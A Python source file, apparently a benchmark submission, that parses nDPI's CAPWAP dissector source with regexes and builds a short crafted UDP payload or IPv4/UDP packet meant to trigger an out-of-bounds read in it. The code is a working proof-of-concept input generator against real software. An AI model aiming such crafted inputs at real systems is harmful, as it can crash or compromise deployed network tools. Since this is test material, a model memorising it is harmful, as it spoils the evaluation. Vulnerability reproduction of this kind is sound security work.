import os
import re
import tarfile
import tempfile
from typing import Dict, Iterable, List, Optional, Tuple


def _iter_source_files_from_dir(root: str) -> Iterable[Tuple[str, bytes]]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not any(fn.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp")):
                continue
            p = os.path.join(dirpath, fn)
            try:
                with open(p, "rb") as f:
                    data = f.read()
                yield p, data
            except Exception:
                continue


def _iter_source_files_from_tar(tar_path: str) -> Iterable[Tuple[str, bytes]]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name
                if not any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp")):
                    continue
                if m.size > 10_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    yield name, data
                except Exception:
                    continue
    except Exception:
        return


def _iter_source_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_source_files_from_dir(src_path)
    else:
        yield from _iter_source_files_from_tar(src_path)


def _extract_c_function(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None
    start = text.rfind("\n", 0, idx)
    start = 0 if start < 0 else start + 1

    brace = text.find("{", idx)
    if brace < 0:
        return None

    i = brace
    depth = 0
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[start : i + 1]
        i += 1
    return None


def _ip_checksum(header: bytes) -> int:
    if len(header) % 2 == 1:
        header += b"\x00"
    s = 0
    for i in range(0, len(header), 2):
        s += (header[i] << 8) | header[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _pack_u16(x: int) -> bytes:
    return bytes([(x >> 8) & 0xFF, x & 0xFF])


def _pack_u32(x: int) -> bytes:
    return bytes([(x >> 24) & 0xFF, (x >> 16) & 0xFF, (x >> 8) & 0xFF, x & 0xFF])


def _detect_input_mode(files: List[Tuple[str, str]]) -> str:
    harness_texts = []
    for name, txt in files:
        if "LLVMFuzzerTestOneInput" in txt or "AFL" in txt or "fuzz" in name.lower() or "fuzzer" in name.lower():
            harness_texts.append((name, txt))
    if not harness_texts:
        harness_texts = files[:]

    ip_score = 0
    payload_score = 0
    for _, txt in harness_texts:
        if "ndpi_detection_process_packet" in txt or "ndpi_workflow_process_packet" in txt:
            ip_score += 2
        if "struct ndpi_iphdr" in txt or "ndpi_iphdr" in txt:
            ip_score += 2
        if re.search(r"\biph\s*=\s*\(.*ndpi_iphdr", txt):
            ip_score += 2
        if re.search(r"packet\.(payload|payload_packet_len)\s*=", txt) or re.search(r"packet->(payload|payload_packet_len)\s*=", txt):
            payload_score += 2
        if re.search(r"(flow|packet)->payload\s*=\s*\(.*data", txt) or re.search(r"\bpayload\s*=\s*\(.*data", txt):
            payload_score += 1

    if payload_score > ip_score + 1:
        return "payload"
    return "ip"


def _analyze_capwap_function(fn_text: str) -> Tuple[int, int, Dict[int, Tuple[int, int]]]:
    ports = []
    for m in re.finditer(r"\b(5246|5247)\b", fn_text):
        ports.append(int(m.group(1)))
    port = 5247 if 5247 in ports else (5246 if 5246 in ports else 5247)

    lines = fn_text.splitlines()

    def _count_braces(s: str) -> Tuple[int, int]:
        return s.count("{"), s.count("}")

    len_vars_re = re.compile(r"(?:packet->)?payload(?:_packet)?_len|payload_packet_len|payload_len|payload_packet_len", re.IGNORECASE)
    cmp_re = re.compile(r"(?:packet->)?payload(?:_packet)?_len|payload_packet_len|payload_len", re.IGNORECASE)

    access_byte_re = re.compile(r"(?:packet->)?payload\s*\[\s*(\d+)\s*\]")
    get16_re = re.compile(r"get_u_int16_t\s*\(\s*[^,]+,\s*(\d+)\s*\)")
    get32_re = re.compile(r"get_u_int32_t\s*\(\s*[^,]+,\s*(\d+)\s*\)")

    min_len = 0
    brace_level = 0
    stack: List[Tuple[int, int]] = []

    candidates: List[Tuple[int, int, int]] = []

    def _lookahead_has_return(i: int, limit: int = 6) -> bool:
        s = lines[i]
        if "return" in s or "NDPI_EXCLUDE_PROTO" in s:
            return True
        lvl = brace_level
        la = 0
        while la < limit and i + la < len(lines):
            t = lines[i + la]
            if "return" in t or "NDPI_EXCLUDE_PROTO" in t:
                return True
            ob, cb = _count_braces(t)
            lvl += ob - cb
            la += 1
            if la > 0 and "}" in t and lvl <= brace_level:
                break
        return False

    def _apply_guard_min_len(line: str, i: int) -> int:
        nonlocal min_len
        if "if" not in line:
            return min_len
        if not cmp_re.search(line):
            return min_len
        m = re.search(r"(?:packet->)?payload(?:_packet)?_len|payload_packet_len|payload_len", line, re.IGNORECASE)
        if not m:
            return min_len
        g = re.search(r"(?:packet->)?payload(?:_packet)?_len|payload_packet_len|payload_len\s*(<=|<)\s*(\d+)", line, re.IGNORECASE)
        if not g:
            return min_len
        op = g.group(1)
        n = int(g.group(2))
        if _lookahead_has_return(i):
            req = n + (1 if op == "<=" else 0)
            if req > min_len:
                min_len = req
        return min_len

    def _maybe_enter_min_len_block(line: str) -> None:
        nonlocal min_len
        if "if" not in line or "{" not in line:
            return
        if not cmp_re.search(line):
            return
        g = re.search(r"(?:packet->)?payload(?:_packet)?_len|payload_packet_len|payload_len\s*(>=|>)\s*(\d+)", line, re.IGNORECASE)
        if not g:
            return
        op = g.group(1)
        n = int(g.group(2))
        req = n + (1 if op == ">" else 0)
        saved = min_len
        new_min = max(min_len, req)
        level_before = brace_level
        stack.append((level_before, saved))
        min_len = new_min

    for i, line in enumerate(lines):
        while stack and brace_level <= stack[-1][0]:
            _, saved = stack.pop()
            min_len = saved

        _apply_guard_min_len(line, i)
        _maybe_enter_min_len_block(line)

        local_min = max(1, min_len)

        for mm in access_byte_re.finditer(line):
            k = int(mm.group(1))
            if k >= local_min:
                candidates.append((local_min, i, k))

        for mm in get16_re.finditer(line):
            o = int(mm.group(1))
            k = o + 1
            if k >= local_min:
                candidates.append((local_min, i, k))

        for mm in get32_re.finditer(line):
            o = int(mm.group(1))
            k = o + 3
            if k >= local_min:
                candidates.append((local_min, i, k))

        ob, cb = _count_braces(line)
        brace_level += ob - cb
        while stack and brace_level <= stack[-1][0]:
            _, saved = stack.pop()
            min_len = saved

    if candidates:
        candidates.sort(key=lambda x: (x[0], x[1], x[2]))
        chosen_len, chosen_line, _ = candidates[0]
    else:
        chosen_len, chosen_line = 5, len(lines)

    chosen_len = max(1, min(chosen_len, 128))

    constraints: Dict[int, Tuple[int, int]] = {}

    def _set_mask_value(idx: int, mask: int, val: int) -> None:
        if idx not in constraints:
            constraints[idx] = (mask & 0xFF, val & 0xFF)
            return
        m0, v0 = constraints[idx]
        nm = (m0 | (mask & 0xFF)) & 0xFF
        nv = (v0 & (~mask & 0xFF)) | (val & mask & 0xFF)
        constraints[idx] = (nm, nv)

    def _set_eq(idx: int, val: int) -> None:
        constraints[idx] = (0xFF, val & 0xFF)

    relevant_text = "\n".join(lines[: min(chosen_line + 1, len(lines))])

    for mm in re.finditer(r"(?:packet->)?payload\s*\[\s*(\d+)\s*\]\s*==\s*(0x[0-9a-fA-F]+|\d+)", relevant_text):
        idx = int(mm.group(1))
        if idx < chosen_len:
            v = int(mm.group(2), 0)
            _set_eq(idx, v)

    for mm in re.finditer(r"\(\s*(?:packet->)?payload\s*\[\s*(\d+)\s*\]\s*&\s*(0x[0-9a-fA-F]+|\d+)\s*\)\s*==\s*(0x[0-9a-fA-F]+|\d+)", relevant_text):
        idx = int(mm.group(1))
        if idx < chosen_len:
            mask = int(mm.group(2), 0) & 0xFF
            val = int(mm.group(3), 0) & 0xFF
            _set_mask_value(idx, mask, val)

    for mm in re.finditer(r"get_u_int16_t\s*\(\s*[^,]+,\s*(\d+)\s*\)\s*==\s*(0x[0-9a-fA-F]+|\d+)", relevant_text):
        off = int(mm.group(1))
        v = int(mm.group(2), 0) & 0xFFFF
        if off + 1 < chosen_len:
            _set_eq(off, (v >> 8) & 0xFF)
            _set_eq(off + 1, v & 0xFF)

    for mm in re.finditer(r"get_u_int32_t\s*\(\s*[^,]+,\s*(\d+)\s*\)\s*==\s*(0x[0-9a-fA-F]+|\d+)", relevant_text):
        off = int(mm.group(1))
        v = int(mm.group(2), 0) & 0xFFFFFFFF
        if off + 3 < chosen_len:
            _set_eq(off, (v >> 24) & 0xFF)
            _set_eq(off + 1, (v >> 16) & 0xFF)
            _set_eq(off + 2, (v >> 8) & 0xFF)
            _set_eq(off + 3, v & 0xFF)

    return chosen_len, port, constraints


def _build_udp_payload(length: int, constraints: Dict[int, Tuple[int, int]], fn_text: Optional[str]) -> bytes:
    b = [0] * length

    for idx, (mask, val) in constraints.items():
        if 0 <= idx < length:
            b[idx] = (b[idx] & (~mask & 0xFF)) | (val & mask & 0xFF)

    if fn_text:
        lines = fn_text.splitlines()
        key_words = ("hlen", "header", "offset", "length", "len", "size")
        used_idxs = set()
        for ln in lines:
            if "payload" not in ln:
                continue
            if not any(k in ln.lower() for k in key_words):
                continue
            for mm in re.finditer(r"(?:packet->)?payload\s*\[\s*(\d+)\s*\]", ln):
                used_idxs.add(int(mm.group(1)))
            for mm in re.finditer(r"get_u_int16_t\s*\(\s*[^,]+,\s*(\d+)\s*\)", ln):
                o = int(mm.group(1))
                used_idxs.add(o)
                used_idxs.add(o + 1)
            for mm in re.finditer(r"get_u_int32_t\s*\(\s*[^,]+,\s*(\d+)\s*\)", ln):
                o = int(mm.group(1))
                used_idxs.update((o, o + 1, o + 2, o + 3))

        for idx in used_idxs:
            if 0 <= idx < length:
                mask, val = constraints.get(idx, (0, 0))
                free = (~mask) & 0xFF
                b[idx] = (b[idx] & mask) | free | (val & mask)

    return bytes(b)


def _build_ipv4_udp_packet(udp_payload: bytes, dst_port: int, src_port: int = 1234) -> bytes:
    ip_hdr_len = 20
    udp_hdr_len = 8
    total_len = ip_hdr_len + udp_hdr_len + len(udp_payload)

    ver_ihl = 0x45
    tos = 0
    ident = 0
    flags_frag = 0
    ttl = 64
    proto = 17
    checksum = 0
    src_ip = 0x01020304
    dst_ip = 0x05060708

    ip_hdr_wo_csum = bytes([
        ver_ihl,
        tos,
        (total_len >> 8) & 0xFF,
        total_len & 0xFF,
        (ident >> 8) & 0xFF,
        ident & 0xFF,
        (flags_frag >> 8) & 0xFF,
        flags_frag & 0xFF,
        ttl,
        proto,
        0,
        0,
    ]) + _pack_u32(src_ip) + _pack_u32(dst_ip)

    checksum = _ip_checksum(ip_hdr_wo_csum)
    ip_hdr = ip_hdr_wo_csum[:10] + _pack_u16(checksum) + ip_hdr_wo_csum[12:]

    udp_len = udp_hdr_len + len(udp_payload)
    udp_hdr = _pack_u16(src_port & 0xFFFF) + _pack_u16(dst_port & 0xFFFF) + _pack_u16(udp_len & 0xFFFF) + _pack_u16(0)

    return ip_hdr + udp_hdr + udp_payload


class Solution:
    def solve(self, src_path: str) -> bytes:
        file_texts: List[Tuple[str, str]] = []
        capwap_fn_text: Optional[str] = None

        for name, data in _iter_source_files(src_path):
            txt = data.decode("utf-8", "ignore")
            file_texts.append((name, txt))
            if capwap_fn_text is None and "ndpi_search_setup_capwap" in txt:
                extracted = _extract_c_function(txt, "ndpi_search_setup_capwap")
                if extracted:
                    capwap_fn_text = extracted

        mode = _detect_input_mode(file_texts)

        if capwap_fn_text:
            payload_len, port, constraints = _analyze_capwap_function(capwap_fn_text)
        else:
            payload_len, port, constraints = 5, 5247, {}

        if payload_len <= 5:
            payload_len = 5
        elif payload_len > 64:
            payload_len = 64

        udp_payload = _build_udp_payload(payload_len, constraints, capwap_fn_text)

        if mode == "payload":
            return udp_payload

        return _build_ipv4_udp_packet(udp_payload, dst_port=port, src_port=1234)